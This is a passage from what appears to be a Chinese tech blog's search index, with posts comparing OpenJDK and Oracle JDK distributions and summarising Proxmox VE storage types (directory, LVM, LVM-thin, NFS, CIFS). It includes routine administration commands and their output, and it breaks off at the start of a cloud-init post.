(修改了一些功能的实现方式，再打上自己的商标并提供配套服务)。或者应该说自 Java SE 7开始往后的版本，所有的 JDK 都源自于 Open JDK (OpenJDK 与 其他 JDK 的关系就和 Linux 与它的众多发行版是一样一样的)。</p>\n<h2 id=\"OpenJDK-Vs-Oracle-JDK\"><a href=\"#OpenJDK-Vs-Oracle-JDK\" class=\"headerlink\" title=\"OpenJDK Vs Oracle JDK\"></a>OpenJDK Vs Oracle JDK</h2><p><code>OpenJDK</code>和<code>Oracle JDK</code> 是通过<code>TCK</code>认证的同一Java规范的实现。换句话说，<code>Oracle JDK</code>是<code>OpenJDK</code>的商业发行版（非开源发行版），就如同Chrome和Chrominum的关系。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">项目</th>\n<th align=\"center\">Oracle JDK</th>\n<th align=\"center\">OpenJDK</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">许可证</td>\n<td align=\"center\">Oracle公司的商业（非开源）许可证</td>\n<td align=\"center\">基于GPL v2许可证的开源授权</td>\n</tr>\n<tr>\n<td align=\"center\">开发方</td>\n<td align=\"center\">Oracle公司，可以使用Java商标</td>\n<td align=\"center\">OpenJDK开源社区，不允许使用Java商标</td>\n</tr>\n<tr>\n<td align=\"center\">性能优化</td>\n<td align=\"center\">根据Sun JDK的开发和实现提供性能</td>\n<td align=\"center\">提供由Oracle JDK之上的一些供应商开发的高性能</td>\n</tr>\n<tr>\n<td align=\"center\">发行方式</td>\n<td align=\"center\">仅提供二进制代码</td>\n<td align=\"center\">基于社区源代码，各方自行定制发行版</td>\n</tr>\n<tr>\n<td align=\"center\">费用</td>\n<td align=\"center\">基于Oracle许可证，高级功能可能收费</td>\n<td align=\"center\">完全开源和免费使用</td>\n</tr>\n<tr>\n<td align=\"center\">操作系统</td>\n<td align=\"center\">Windows，Linux，Solaris，MacOS</td>\n<td align=\"center\"><strong>FreeBSD</strong>，Linux，Microsoft Windows，Mac OS X</td>\n</tr>\n</tbody></table>\n<p>简单一点说，<code>OpenJDK</code>源代码是<code>Oracle JDK</code>的一个子集，只包含最精简的JDK。</p>\n<ul>\n<li>OpenJDK不包含Deployment组件（Browser Plugin、Java Web Start、Java控制面板等），当然这些功能也没人用</li>\n<li>由于<code>OpenJDK</code>采用<code>GPL</code>许可证，<code>Oracle JDK</code>的一部分源代码（例如JMX的SNMP功能）由于产权的问题无法开园，只能作为Plug可选插件方式提供给OpenJDK编译时使用。而Icedtea则为这些不完整的部分开发了相同功能、但是符合<code>GPL</code>许可证的源代码，促使OpenJDK更加完整</li>\n<li>Oracle JDK的大部分源代码来自于Open JDK，但包含一些Oracle尚未开源的技术组件，也有一些来自于第三方授权的技术组件</li>\n</ul>\n<img src=\"/2021/11/21/OpenJDK%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/vs.jpeg\" class=\"\">\n\n<h2 id=\"OpenJDK-Builds-二进制发行版\"><a href=\"#OpenJDK-Builds-二进制发行版\" class=\"headerlink\" title=\"OpenJDK Builds - 二进制发行版\"></a>OpenJDK Builds - 二进制发行版</h2><h3 id=\"1-Oracle-OpenJDK\"><a href=\"#1-Oracle-OpenJDK\" class=\"headerlink\" title=\"1. Oracle OpenJDK\"></a>1. Oracle OpenJDK</h3><p>没错！OpenJDK Community只负责产生OpenJDK源代码，并不提供可以直接使用的二进制文件格式。<br>OpenJDK官网指向的可下载二进制文件的地址，实际是Oracle公司自行编译后提供的软件。就是这个：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@<span class=\"built_in\">test</span> ~]<span class=\"comment\"># java -version</span></span><br><span class=\"line\">openjdk version <span class=\"string\">&quot;1.8.0_312&quot;</span></span><br><span class=\"line\">OpenJDK Runtime Environment (build 1.8.0_312-b07)</span><br><span class=\"line\">OpenJDK 64-Bit Server VM (build 25.312-b07, mixed mode)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Eclipse-Open-J9\"><a href=\"#2-Eclipse-Open-J9\" class=\"headerlink\" title=\"2. Eclipse Open J9\"></a>2. Eclipse Open J9</h3><p>1996年，IBM公司基于Smalltalk VM开发了J9 VM，并广泛应用于其各类自有产品线。<br>2017年，J9成为Eclipse基金会项目，改名为Open J9，并完全符合 Java JVM 规范。</p>\n<h3 id=\"3-Oracle-GraalVM\"><a href=\"#3-Oracle-GraalVM\" class=\"headerlink\" title=\"3. Oracle GraalVM\"></a>3. Oracle GraalVM</h3><p><code>Graal</code>起源于Sun公司的Maxine虚拟机项目，也是基于HotSpot VM，可以认为是HotSpot的一个变种。<br>特点是有独立的JIT编译器、支持AOT提前编译的等，允许在单个程序中自由混合来自任何编程语言的代码等。<br>Oracle公司现在<code>GraalVM Enterprise</code>的名义提供该产品。<br>第一个正式版本 Graal VM 19.0 于 2019 年 5 月发布。最新版本是 Graal VM 21.0.0，于 2021 年 1 月发布。</p>\n<h3 id=\"4-Azul-Zulu\"><a href=\"#4-Azul-Zulu\" class=\"headerlink\" title=\"4. Azul Zulu\"></a>4. Azul Zulu</h3><p>Azul Systems公司是一家专门从事 Java 和 JVM 产品的公司。主要提供<code>OpenJDK</code> 二进制分发版，并命名为<code>Zulu</code>，包含三个版本：</p>\n<ul>\n<li><code>Zulu Community</code>：基于<code>GPLv2</code>协议的社区免费版</li>\n<li><code>Zulu Enterprise</code>：商业发行版</li>\n<li><code>Zulu Embedded</code>：为嵌入式、移动和物联网设备使用的版本</li>\n<li><code>Zulu PlatForm Prime</code>：服务器使用的高性能版本，原名<code>Zing VM</code></li>\n</ul>\n<blockquote>\n<p>为了适配Apple M1芯片，目前Mackbook Air仅能适配<code>OpenJDK 64-Bit Server VM Zulu16.28+11-CA (build 16+36, mixed mode)</code></p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sj@bogon ~ % java -version</span><br><span class=\"line\">openjdk version <span class=\"string\">&quot;16&quot;</span> 2021-03-16</span><br><span class=\"line\">OpenJDK Runtime Environment Zulu16.28+11-CA (build 16+36)</span><br><span class=\"line\">OpenJDK 64-Bit Server VM Zulu16.28+11-CA (build 16+36, mixed mode)</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"附录1-TCK-Java技术兼容性认证\"><a href=\"#附录1-TCK-Java技术兼容性认证\" class=\"headerlink\" title=\"附录1: TCK - Java技术兼容性认证\"></a>附录1: TCK - Java技术兼容性认证</h2><p>虽然人人都可以运用Java语言编程，Sun仍将Java SE的函数库作为预先编译的Java字节码，附带其API接口一并提供给用户，同时通过技术兼容性测试工具包<code>TCK(Technology Compatibility Kit)</code>以检查第三方产品是否符合Java的规范要求，以确保对java语言生态的有效控制。</p>\n<p>其中，最著名的事件就是<code>Apache Harmony</code>开源项目。</p>\n<p>2005年，Apache基金会主导了<code>Apache Harmony</code>开源项目，目标是以开放源代码方式实现Java SDK，IBM等公司提供了大量代码。<br>由于一直无法获得TCK授权，2011年10月项目宣布停止。核心原因是Java Community Process规定的<code>GPL</code>许可证，与<code>Apache</code>许可证不兼容</p>\n<p>值得指出的是，Google在<code>Android</code>早期开发中，曾经大量使用该项目的源代码，为此长期陷入与Java的专利诉讼，最终决定基于<code>OpenJDK</code>，采用<code>Clean Room</code>模式自主开发了<code>Dalvik VM</code>。</p>\n<p>事实上，谷歌在开放Android时之所以会舍弃Linux的开发语言C&#x2F;C++，关键原因就在于其无法满足Android的二进制分发及跨设备需求，而在抛开不注重运行效率的Python、Ruby等语言后，剩下的也就只有Sun Microsystem的Java与微软的C#。由于当时微软对于开源的态度，也就使得Java就成为了几乎是唯一的选择。</p>\n<p>2021年4月5日，美国最高法院以6票支持2票反对的投票结果，驳回了此前一家联邦巡回法院就甲骨文诉Android侵犯Java版权案作出的裁定，并最终判定谷歌复制Java API代码属于合理使用（fair use）。</p>\n<h2 id=\"附录2：常见的许可证协议\"><a href=\"#附录2：常见的许可证协议\" class=\"headerlink\" title=\"附录2：常见的许可证协议\"></a>附录2：常见的许可证协议</h2><img src=\"/2021/11/21/OpenJDK%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/license.jpg\" class=\"\">\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"官方网站\"><a href=\"#官方网站\" class=\"headerlink\" title=\"官方网站\"></a>官方网站</h3><ul>\n<li>Java Community Process的官网：<a href=\"https://jcp.org/en/home/index\">https://jcp.org/</a></li>\n<li>OpenJDK Community的官网：<a href=\"http://openjdk.java.net/\">http://openjdk.java.net/</a></li>\n<li>OpenJDK Project的Github源码：<a href=\"https://github.com/openjdk/jdk\">https://github.com/openjdk/jdk</a></li>\n</ul>\n<h3 id=\"技术评论\"><a href=\"#技术评论\" class=\"headerlink\" title=\"技术评论\"></a>技术评论</h3><ul>\n<li><a href=\"https://blog.csdn.net/ni_hao_fan/article/details/99677950\">JSR管理模式简介和核心技术规范清单</a></li>\n<li><a href=\"https://zh.wikipedia.org/zh-hans/%E7%94%B2%E9%AA%A8%E6%96%87%E8%AF%89%E8%B0%B7%E6%AD%8CJava%E4%BE%B5%E6%9D%83%E6%A1%88\">甲骨文诉谷歌Java侵权案 - WiKI</a></li>\n<li><a href=\"https://www.jiemian.com/article/5914484.html\">世纪诉讼迎来终局，Android不会有Java税了</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/31881162\">开源许可证GPL、BSD、MIT、Mozilla、Apache和LGPL的区别</a></li>\n<li><a href=\"https://juejin.cn/post/6844903811069247496\">Oracle与OpenJDK之间的区别</a></li>\n</ul>\n"},{"title":"Proxmox-VE的存储管理小结","url":"/2021/01/17/Proxmox-VE%E7%9A%84%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E5%B0%8F%E7%BB%93/","content":"<h2 id=\"一、PVE存储的性质类型（Storage-Properties）\"><a href=\"#一、PVE存储的性质类型（Storage-Properties）\" class=\"headerlink\" title=\"一、PVE存储的性质类型（Storage Properties）\"></a>一、PVE存储的性质类型（Storage Properties）</h2><p>PVE需要管理的存储资源，分为以下6种，分别用于不同类型的数据持久化。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">标识符</th>\n<th align=\"left\">类型</th>\n<th align=\"left\">特性说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">iso</td>\n<td align=\"left\">安装盘</td>\n<td align=\"left\">ISO images，包括Centos、Ubuntu等操作系统的安装镜像文件，也可以是Win7安装盘</td>\n</tr>\n<tr>\n<td align=\"center\">vztmpl</td>\n<td align=\"left\">模版文件</td>\n<td align=\"left\">Container templates，LXC的模版文件，仅支持Linunx类型</td>\n</tr>\n<tr>\n<td align=\"center\">rootdir</td>\n<td align=\"left\">根系统</td>\n<td align=\"left\">Allow to store container data.用于VM或LXC的系统盘</td>\n</tr>\n<tr>\n<td align=\"center\">images</td>\n<td align=\"left\">虚拟磁盘</td>\n<td align=\"left\">KVM-Qemu VM images，一般用于数据盘，VM或LXC均可挂载，文件格式或者LV块设备均可以</td>\n</tr>\n<tr>\n<td align=\"center\">backup</td>\n<td align=\"left\">备份文件</td>\n<td align=\"left\">Backup files (vzdump).VM或LXC均可以使用，通常是文件格式</td>\n</tr>\n<tr>\n<td align=\"center\">snippets</td>\n<td align=\"left\">快照文件</td>\n<td align=\"left\">Snippet files, for example guest hook scripts，VM或LXC快照文件</td>\n</tr>\n</tbody></table>\n<h2 id=\"二、PVE存储的设备类型（Storage-Types）\"><a href=\"#二、PVE存储的设备类型（Storage-Types）\" class=\"headerlink\" title=\"二、PVE存储的设备类型（Storage Types）\"></a>二、PVE存储的设备类型（Storage Types）</h2><p>与通常的UNIX系统一样，Proxmox VE支持基于POSIX的文件系统存储和基于RAW裸设备的块存储设备。<br>裸设备一般建在LV上，没有filesystem，因此无法支持iso、vztmpl、backup，但可以支持rootdir、image。</p>\n<p>各种存储方式的特性见下表。</p>\n<img src=\"/2021/01/17/Proxmox-VE%E7%9A%84%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E5%B0%8F%E7%BB%93/proxmox-storage-types.png\" class=\"\">\n\n<blockquote>\n<p>1: 绝大部分文件系统本身不支持快照功能。如果要创建虚拟机快照，只能利用 qcow2 文件格式自带的快照功能。<br>2: 如果后端存储是FC光纤存储设备，或是iSCSI存储设备，LVM方式可以提供共享资源。</p>\n</blockquote>\n<p>下面介绍几个最重要的存储类型：</p>\n<h3 id=\"1-目录（Directory）\"><a href=\"#1-目录（Directory）\" class=\"headerlink\" title=\"1. 目录（Directory）\"></a>1. 目录（Directory）</h3><p>Proxmox VE 可以使用本地目录或挂载在本地文件系统的共享存储作为存储服务。<br>目录是文件系统级的存储服务，你可以保存任何类型的数据，包括虚拟机镜像，容器，模板， ISO 镜像或虚拟机备份文件。<br>PVE初始安装生成的<code>local</code>存储就是<code>Directory</code>属性，其路径是<code>/var/lib/vz</code>。</p>\n<img src=\"/2021/01/17/Proxmox-VE%E7%9A%84%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E5%B0%8F%E7%BB%93/shot2.png\" class=\"\">\n\n<p>可以看到，其中<code>dump</code>目录存储的就是备份文件，<code>template</code>目录存储的就是VM模版和LXC模版。</p>\n<h3 id=\"2-逻辑卷（LVM）\"><a href=\"#2-逻辑卷（LVM）\" class=\"headerlink\" title=\"2.逻辑卷（LVM）\"></a>2.逻辑卷（LVM）</h3><p>LVM 是典型的块存储解决方案，但 LVM 后端存储本身不支持快照和链接克隆功能。更不幸的是，在创建普通 LVM 快照期间，整个卷组的写操作都会受到影响而变得非常低效。</p>\n<blockquote>\n<p>LVM最大的好处是你可以在共享存储上建立 LVM 后端存储服务。例如可以在 iSCSI LUN 上建立 LVM。LVM 后端存储自带 Proxmox VE 集群锁以有效防止并发访问冲突。</p>\n</blockquote>\n<p>LVM的创建包含了以下步骤： Device -&gt; Partition -&gt; Phycial Volume -&gt; Volume Group -&gt; Login Volume，具体步骤参见附录1。</p>\n<img src=\"/2021/01/17/Proxmox-VE%E7%9A%84%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E5%B0%8F%E7%BB%93/shot4.png\" class=\"\">\n\n<h3 id=\"3-薄模式的逻辑卷（LVM-thin）\"><a href=\"#3-薄模式的逻辑卷（LVM-thin）\" class=\"headerlink\" title=\"3. 薄模式的逻辑卷（LVM-thin）\"></a>3. 薄模式的逻辑卷（LVM-thin）</h3><p>LVM 是在逻辑卷创建时就按设置的卷容量大小预先分配所需空间。LVM-thin 存储池是在向 卷内写入数据时按实际写入数据量大小分配所需空间。LVM-thin 所用的存储空间分配方式允许创建容量远大于物理存储空间的存储卷，因此也称为“薄模式”。</p>\n<blockquote>\n<p>注意：LVM-thin 存储池不能被多个节点同时共享使用，只能用于节点本地存储.</p>\n</blockquote>\n<p>创建和管理 LVM-thin 存储池的命令和 LVM 命令完全一致(参见 man lvmthin)。假定你已 经有一个 LVM 卷组 pve，如下命令可以创建一个名为 data 的新 LVM-thin 存储池(容量 100G):</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">lvcreate -L 100G -n data pve</span><br><span class=\"line\">lvconvert --type thin-pool pve/data</span><br></pre></td></tr></table></figure>\n\n<p>也可以在PVE的GUI界面进行操作。</p>\n<img src=\"/2021/01/17/Proxmox-VE%E7%9A%84%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E5%B0%8F%E7%BB%93/shot4.png\" class=\"\">\n\n<h3 id=\"4-网络文件系统（NFS）\"><a href=\"#4-网络文件系统（NFS）\" class=\"headerlink\" title=\"4. 网络文件系统（NFS）\"></a>4. 网络文件系统（NFS）</h3><p>基于 NFS 的后端存储服务实际上建立在目录后端存储之上，其属性和目录后端存储非常相似。其中子目录布局和文件命名规范完全一致。<br>NFS 后端存储的优势在于，你可以通过配置 NFS 服务器参数，实现 NFS 存储服务自动挂载，而无需编辑修改&#x2F;etc&#x2F;fstab 文件。</p>\n<p>NFS 存储服务能够自动检测 NFS 服务器的在线状态，并自动连接 NFS 服务器输出的共享存储服务。</p>\n<h3 id=\"5-Windows文件共享（CIFS）\"><a href=\"#5-Windows文件共享（CIFS）\" class=\"headerlink\" title=\"5. Windows文件共享（CIFS）\"></a>5. Windows文件共享（CIFS）</h3><p>CIFS（Common Internet File System）就是 SMB 的改进版本。Windows的文件共享其实就是使用了 SMB或者说 CIFS。<br>基于 CIFS 的后端存储可用于扩展基于目录的存储，这样就无需再手工配置 CIFS 挂载。该类 型存储可直接通过 Proxmox VE API 或 WebUI 添加。服务器心跳检测或共享输出选项等后端 存储参数配置也将自动完成配置。</p>\n<h2 id=\"三、PVE默认安装的实例分析\"><a href=\"#三、PVE默认安装的实例分析\" class=\"headerlink\" title=\"三、PVE默认安装的实例分析\"></a>三、PVE默认安装的实例分析</h2><p>在默认安装完成后，PVE将后端存储的配置文件存放在<code>/etc/pve/storage.cfg</code>中。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@pve01:~# cat /etc/pve/storage.cfg</span><br><span class=\"line\">dir: local</span><br><span class=\"line\">    path /var/lib/vz</span><br><span class=\"line\">    content vztmpl,iso,backup</span><br><span class=\"line\"></span><br><span class=\"line\">lvmthin: local-lvm</span><br><span class=\"line\">    thinpool data</span><br><span class=\"line\">    vgname pve</span><br><span class=\"line\">    content images,rootdir</span><br><span class=\"line\"></span><br><span class=\"line\">nfs: nfs130</span><br><span class=\"line\">    export /data/nfs</span><br><span class=\"line\">    path /mnt/pve/nfs130</span><br><span class=\"line\">    server 192.168.0.130</span><br><span class=\"line\">    content images</span><br></pre></td></tr></table></figure>\n\n<p>PVE默认存储配置至少包含了2个资源池（Storage Pools）：</p>\n<ul>\n<li>local<br>基于目录模式，用于iso、vztmpl、backup、snippets等文件存储。<br>物理资源位于<code>/dev/sda3</code>磁盘分区，逻辑卷是<code>pve-root</code><br>mount挂载点是<code>/var/lib/vz</code>。</li>\n<li>local-lvm<br>基于薄模式的逻辑卷，用于存储容器的系统盘rootdir，和数据盘image。<br>物理资源位于<code>/dev/sda3</code>磁盘分区，逻辑卷分为两个部分：管理元数据的<code>pve-data_tmeta</code>，和管理实际数据的<code>pve-data_tdeta</code></li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@pve01:~# lsblk</span><br><span class=\"line\">NAME                            MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT</span><br><span class=\"line\">sda                               8:0    0 111.8G  0 disk </span><br><span class=\"line\">├─sda1                            8:1    0  1007K  0 part </span><br><span class=\"line\">├─sda2                            8:2    0   512M  0 part /boot/efi</span><br><span class=\"line\">└─sda3                            8:3    0 111.3G  0 part </span><br><span class=\"line\">  ├─pve-swap                    253:0    0     8G  0 lvm  [SWAP]</span><br><span class=\"line\">  ├─pve-root                    253:1    0  27.8G  0 lvm  /</span><br><span class=\"line\">  ├─pve-data_tmeta              253:2    0     1G  0 lvm  </span><br><span class=\"line\">  │ └─pve-data-tpool            253:4    0  59.7G  0 lvm  </span><br><span class=\"line\">  │   ├─pve-data                253:5    0  59.7G  0 lvm  </span><br><span class=\"line\">  │   ├─pve-vm--198--cloudinit  253:7    0     4M  0 lvm  </span><br><span class=\"line\">  │   ├─pve-vm--198--disk--0    253:8    0     4G  0 lvm  </span><br><span class=\"line\">  │   ├─pve-vm--199--disk--0    253:9    0     4G  0 lvm  </span><br><span class=\"line\">  │   ├─pve-vm--199--cloudinit  253:10   0     4M  0 lvm  </span><br><span class=\"line\">  │   ├─pve-vm--121--cloudinit  253:11   0     4M  0 lvm  </span><br><span class=\"line\">  │   └─pve-base--121--disk--0  253:26   0     4G  1 lvm  </span><br><span class=\"line\">  └─pve-data_tdata              253:3    0  59.7G  0 lvm  </span><br><span class=\"line\">    └─pve-data-tpool            253:4    0  59.7G  0 lvm  </span><br><span class=\"line\">      ├─pve-data                253:5    0  59.7G  0 lvm  </span><br><span class=\"line\">      ├─pve-vm--198--cloudinit  253:7    0     4M  0 lvm  </span><br><span class=\"line\">      ├─pve-vm--198--disk--0    253:8    0     4G  0 lvm  </span><br><span class=\"line\">      ├─pve-vm--199--disk--0    253:9    0     4G  0 lvm  </span><br><span class=\"line\">      ├─pve-vm--199--cloudinit  253:10   0     4M  0 lvm  </span><br><span class=\"line\">      ├─pve-vm--121--cloudinit  253:11   0     4M  0 lvm  </span><br><span class=\"line\">      ├─pve-vm--199--state--dns 253:17   0   1.5G  0 lvm  </span><br><span class=\"line\">      └─pve-base--121--disk--0  253:26   0     4G  1 lvm  </span><br><span class=\"line\">nvme0n1                         259:0    0   477G  0 disk </span><br><span class=\"line\">├─data02-data02_tmeta           253:23   0   4.8G  0 lvm  </span><br><span class=\"line\">│ └─data02-data02               253:28   0 467.3G  0 lvm  </span><br><span class=\"line\">└─data02-data02_tdata           253:27   0 467.3G  0 lvm  </span><br><span class=\"line\">  └─data02-data02               253:28   0 467.3G  0 lvm  </span><br><span class=\"line\"></span><br><span class=\"line\">root@pve01:/var/lib/vz# tree /var/lib/vz</span><br><span class=\"line\">/var/lib/vz</span><br><span class=\"line\">├── dump</span><br><span class=\"line\">│   ├── vzdump-qemu-120-2021_01_18-00_17_53.log</span><br><span class=\"line\">│   └── vzdump-qemu-120-2021_01_18-00_17_53.vma.zst</span><br><span class=\"line\">├── images</span><br><span class=\"line\">└── template</span><br><span class=\"line\">    ├── cache</span><br><span class=\"line\">    │   ├── alpine-3.11-default_20200425_amd64.tar.xz</span><br><span class=\"line\">    │   ├── centos-7-default_20190926_amd64.tar.xz</span><br><span class=\"line\">    │   └── ubuntu-18.04-standard_18.04.1-1_amd64.tar.gz</span><br><span class=\"line\">    ├── iso</span><br><span class=\"line\">    │   ├── CentOS-7-x86_64-DVD-2003.iso</span><br><span class=\"line\">    │   ├── CentOS-7-x86_64-Minimal-2003.iso</span><br><span class=\"line\">    │   └── ubuntu-18.04.4-live-server-amd64.iso</span><br><span class=\"line\">    └── qemu</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、结论\"><a href=\"#四、结论\" class=\"headerlink\" title=\"四、结论\"></a>四、结论</h2><ul>\n<li>PVE安装后，将默认提供基于dir的<code>local</code>资源池，和基于LVM-thin的<code>local-lvm</code>资源池。</li>\n<li>对于容器管理的场景，LVM-thin是最佳方案。<br>优点一是基于宿主机的本地磁盘，可靠性高，性能好，二是动态的容量管理，“用多少是多少”；<br>缺点是不支持PVE多节点的共享。</li>\n<li>对于备份和快照管理的场景，NFS是最佳方案。<br>优点是部署配置简单，可以支持多容器的共享存储；<br>缺点是依赖网络和外部服务器，可靠性较低，性能也受限。<br>特别指出，如果已经有WDCLOUD之类的网络存储，直接用CIFS更方便，无需单独部署NFS服务器。</li>\n<li>LVM方案的功能和LVM-thin基本类似，但配置更复杂、资源利用率低，不建议使用。<br>其唯一的价值在于，如果后端存储是iSCSI或FC类型的高端的集中式存储设备，可以支持多容器之间的共享。</li>\n<li>GlusterFS 和Ceph都是典型的分布式存储系统，都提供文件存储、块存储功能（在应用层面还提供对象存储功能）</li>\n<li>ZFS的性能非常好，提供copy-on-write，快照、存储空间池等高级功能，但其设计思想仍然是传统的基于磁盘管理的文件系统<br>ZFS的重要价值在于，可以通过适度的CPU和内存负载以及简单的管理来取代成本高昂的硬件RAID卡</li>\n</ul>\n<hr>\n<h2 id=\"附录1：安装LVM2\"><a href=\"#附录1：安装LVM2\" class=\"headerlink\" title=\"附录1：安装LVM2\"></a>附录1：安装LVM2</h2><p>Centos基本安装包并不包含LVM管理功能，需用<code>yum install lvm2</code>自行安装。</p>\n<ul>\n<li>PV（Physical Volume）- 物理卷<br>  物理卷在逻辑卷管理中处于最底层，它可以是实际物理硬盘上的分区，也可以是整个物理硬盘，也可以是raid设备。</li>\n<li>VG（Volumne Group）- 卷组<br>  卷组建立在物理卷之上，一个卷组中至少要包括一个物理卷，在卷组建立之后可动态添加物理卷到卷组中。一个逻辑卷管理系统工程中可以只有一个卷组，也可以拥有多个卷组。</li>\n<li>LV（Logical Volume）- 逻辑卷<br>  逻辑卷建立在卷组之上，卷组中的未分配空间可以用于建立新的逻辑卷，逻辑卷建立后可以动态地扩展和缩小空间。系统中的多个逻辑卷可以属于同一个卷组，也可以属于不同的多个卷组。</li>\n</ul>\n<img src=\"/2021/01/17/Proxmox-VE%E7%9A%84%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E5%B0%8F%E7%BB%93/lvm2.png\" class=\"\">\n\n<p>在安装lvm2后，就可以使用以下命令了。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@pve01:~# pvs</span><br><span class=\"line\">  PV           VG           Fmt  Attr PSize    PFree  </span><br><span class=\"line\">  /dev/nvme0n1 date-nvme0n1 lvm2 a--  &lt;476.94g 124.00m</span><br><span class=\"line\">  /dev/sda3    pve          lvm2 a--  &lt;111.29g  13.87g</span><br><span class=\"line\">root@pve01:~# vgs</span><br><span class=\"line\">  VG           #PV #LV #SN Attr   VSize    VFree  </span><br><span class=\"line\">  date-nvme0n1   1   1   0 wz--n- &lt;476.94g 124.00m</span><br><span class=\"line\">  pve            1  24   0 wz--n- &lt;111.29g  13.87g</span><br><span class=\"line\">root@pve01:~# lvs</span><br><span class=\"line\">  LV                     VG           Attr       LSize    Pool Origin          Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class=\"line\">  date-nvme0n1           date-nvme0n1 twi-aotz-- &lt;467.28g                      0.00   0.37                            </span><br><span class=\"line\">  base-120-disk-0        pve          Vri-a-tz-k    4.00g data                 38.28                                  </span><br><span class=\"line\">  base-121-disk-0        pve          Vri-a-tz-k    4.00g data                 38.53                                  </span><br><span class=\"line\">  base-122-disk-0        pve          Vri-a-tz-k    8.00g data                 54.14                                  </span><br><span class=\"line\">  data                   pve          twi-aotz--   59.66g                      42.54  2.87                            </span><br><span class=\"line\">  root                   pve          -wi-ao----   27.75g                                                             </span><br><span class=\"line\">  snap_vm-199-disk-0_dns pve          Vri---tz-k    4.00g data vm-199-disk-0                                          </span><br><span class=\"line\">  swap                   pve          -wi-ao----    8.00g                                                             </span><br><span class=\"line\">  vm-100-cloudinit       pve          Vwi-a-tz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-100-disk-0          pve          Vwi-a-tz--   12.00g data                 59.46                                  </span><br><span class=\"line\">  vm-120-cloudinit       pve          Vwi-a-tz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-121-cloudinit       pve          Vwi-a-tz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-122-cloudinit       pve          Vwi-a-tz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-160-disk-0          pve          Vwi-aotz--    8.00g data                 7.74                                   </span><br><span class=\"line\">  vm-198-cloudinit       pve          Vwi-aotz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-198-disk-0          pve          Vwi-aotz--    4.00g data                 38.55                                  </span><br><span class=\"line\">  vm-199-cloudinit       pve          Vwi-aotz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-199-disk-0          pve          Vwi-aotz--    4.00g data                 38.56                                  </span><br><span class=\"line\">  vm-199-state-dns       pve          Vwi-a-tz--   &lt;1.49g data                 33.03                                  </span><br><span class=\"line\">  vm-200-cloudinit       pve          Vwi-aotz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-200-disk-0          pve          Vwi-aotz--    4.00g data                 38.58                                  </span><br><span class=\"line\">  vm-222-cloudinit       pve          Vwi-a-tz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-222-disk-0          pve          Vwi-a-tz--    4.00g data                 54.27                                  </span><br><span class=\"line\">  vm-223-cloudinit       pve          Vwi-aotz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-223-disk-0          pve          Vwi-aotz--    8.00g data base-122-disk-0 85.10 </span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://blog.51cto.com/6222666/2161799\">Proxmox VE 安装的系列教程</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/145862221\">Proxmox虚拟系统PVE的磁盘分区及文件系统分析总结</a></li>\n<li><a href=\"https://blog.csdn.net/u011069498/article/details/96303220\">CentOS7 LVM与RAID简单使用</a></li>\n<li><a href=\"http://einverne.github.io/post/2020/03/proxmox-install-and-setup.html\">Proxmox 安装和设置</a></li>\n<li><a href=\"https://post.smzdm.com/p/768830/\">ProXmoX VE 安装及基础配置</a></li>\n</ul>\n"},{"title":"Proxmox VE虚拟机的Cloud-init安装记录","url":"/2020/08/02/Proxmox-VE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84Cloud-init%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>Cloud-init的原理，就是给VM增加一个CDROM设备，配合操作系统安装的cloud-init软件包，以便在启动时自动读取网络设置参数。</p>\n<img src=\"/2020/08/02/Proxmox-VE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84Cloud-init%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/hardware.png\" class=\"\">\n\n<p>这个Cloud-init设备的路径一般为<code>/dev/sr0</code>, 大小约为4M，其中包含三个文件，这就是元数据了。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]<span class=\"comment\"># tree /mnt</span></span><br><span class=\"line\">/mnt</span><br><span class=\"line\">├── 